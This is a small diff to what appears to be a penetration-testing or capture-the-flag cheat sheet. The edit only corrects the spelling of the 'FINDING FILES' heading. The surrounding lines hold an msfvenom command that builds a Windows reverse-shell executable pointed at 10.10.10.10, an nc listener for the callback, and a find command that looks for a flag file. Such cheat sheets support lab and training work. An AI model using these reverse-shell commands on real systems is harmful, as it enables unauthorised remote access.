@@ -104,7 +104,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=666 -f exe -o 
 ```
 nc -nvlp 666
 ```
-## FINDIND FILES
+## FINDING FILES
 ##### LINUX - FINDING FILES
 ```
 find / -name local.txt 2> /dev/null
